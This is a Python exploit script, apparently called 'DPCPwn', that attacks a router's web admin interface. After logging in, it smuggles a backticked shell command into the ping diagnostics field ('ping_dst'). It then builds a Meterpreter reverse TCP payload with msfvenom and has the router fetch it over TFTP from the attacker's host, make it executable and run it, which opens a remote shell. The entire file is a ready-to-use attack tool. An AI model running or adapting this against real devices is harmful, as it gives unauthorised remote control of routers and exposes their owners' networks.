import subprocess
import requests
import argparse
import random
import os
import re
from loguru import logger

parser = argparse.ArgumentParser()
parser.add_argument('--rhost', type=str)
parser.add_argument('--rport', type=int, default=80)
parser.add_argument('--lhost', type=str)
parser.add_argument('--lport', type=int, default=4444)
# parser.add_argument('--srvport', type=int)
parser.add_argument('--username', type=str, default='')
parser.add_argument('--password', type=str, default='')
args = parser.parse_args()

phpsessid_pattern = re.compile(f'PHPSESSID=([a-z0-9]+);')

class Router:
    def __init__(self, ip, port):
        self._ip = ip
        self._port = port
        self._session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Origin': f'http://{self.ip}',
            'X-Requested-With': 'XMLHttpRequest',
            'DNT': '1',
            'Connection': 'close',
            'Cookie': 'err_cnt=',
            'Referer': f'http://{self.ip}/Diagnostics.php',
            'Upgrade-Insecure-Requests': '0',
        }

        self._session.headers.update(headers)

    @property
    def ip(self):
        return self._ip

    @property
    def port(self):
        return self._port

    @property
    def url(self):
        return f'http://{self.ip}:{self.port}'

    def login(self, username='', password=''):
        r = self._session.post(f'{self.url}/check.php', data={
            'username_login': username,
            'password_login': password,
            'LanguageSelect': 'en',
            'login': 'Log In',
        })

        cookie = phpsessid_pattern.findall(r.headers['Set-Cookie'])[0]
        self._session.headers['Cookie'] = f'PHPSESSID={cookie}; err_cnt='
        logger.debug(f'{self._session.headers=}')

        # For some reason it doesn't consider our cookie valid unless we visit this (or any?) page first.
        r = self._session.get(f'{self.url}/Administration.php')
        if r.status_code != 200:
            raise PermissionError('Administration.php failed')

    def cmd(self, cmd: str):
        # Simply force command execution using backticks
        payload = f'-h; `{cmd}`;#'
        r = self._session.get(f'{self.url}/actionHandler/checkLogin.php')
        if r.status_code != 200:
            raise PermissionError('checkLogin.php failed')

        r = self._session.post(f'{self.url}/actionHandler/ajaxSet_Diagnostics.php.php', data={
            'ping_ip_start': 'true',
            'ping_dst': payload,
            'ping_size': 56,
            'ping_count': 1,
            'ping_timeout': 1,
        })

        if r.status_code == 401:
            raise PermissionError('Not authenticated')

    def make_rshell(self, local_host: str, local_port: int):
        arch = 'linux/armbe/meterpreter_reverse_tcp'
        characters = [chr(c) for c in list(range(48, 58)) + list(range(97, 123))]
        rshell = ''.join([characters[random.randint(0, 35)] for _ in range(12)])
        logger.debug(f'{rshell=}')

        subprocess.check_output([
            'msfvenom', '-p', arch, f'LHOST={local_host}', f'LPORT={local_port}', '-f', 'elf', '-o', rshell
        ])

        return rshell

    def logout(self):
        r = self._session.get(f'{self.url}/logout.php')

if args.rhost is None or args.rport is None:
    logger.error('rhost and rport are required arguments')
else:
    intro = r'''
__/\\\\\\\\\\\\_____/\\\\\\\\\\\\\__________/\\\\\\\\\__/\\\\\\\\\\\\\____/\\\______________/\\\__/\\\\\_____/\\\_        
 _\/\\\////////\\\__\/\\\/////////\\\_____/\\\////////__\/\\\/////////\\\_\/\\\_____________\/\\\_\/\\\\\\___\/\\\_       
  _\/\\\______\//\\\_\/\\\_______\/\\\___/\\\/___________\/\\\_______\/\\\_\/\\\_____________\/\\\_\/\\\/\\\__\/\\\_      
   _\/\\\_______\/\\\_\/\\\\\\\\\\\\\/___/\\\_____________\/\\\\\\\\\\\\\/__\//\\\____/\\\____/\\\__\/\\\//\\\_\/\\\_     
    _\/\\\_______\/\\\_\/\\\/////////____\/\\\_____________\/\\\/////////_____\//\\\__/\\\\\__/\\\___\/\\\\//\\\\/\\\_    
     _\/\\\_______\/\\\_\/\\\_____________\//\\\____________\/\\\_______________\//\\\/\\\/\\\/\\\____\/\\\_\//\\\/\\\_   
      _\/\\\_______/\\\__\/\\\______________\///\\\__________\/\\\________________\//\\\\\\//\\\\\_____\/\\\__\//\\\\\\_  
       _\/\\\\\\\\\\\\/___\/\\\________________\////\\\\\\\\\_\/\\\_________________\//\\\__\//\\\______\/\\\___\//\\\\\_ 
        _\////////////_____\///____________________\/////////__\///___________________\///____\///_______\///_____\/////__
                                              ------
'''

    print(intro)
    router = Router(ip=args.rhost, port=args.rport)
    router.login(username=args.username, password=args.password)
    rshell = router.make_rshell(args.lhost, args.lport)
    router.cmd(f'cd /tmp; tftp -g -r {rshell} {args.lhost} 2>&1; chmod +x {rshell}; ./{rshell}')
    os.remove(rshell)
    router.logout()
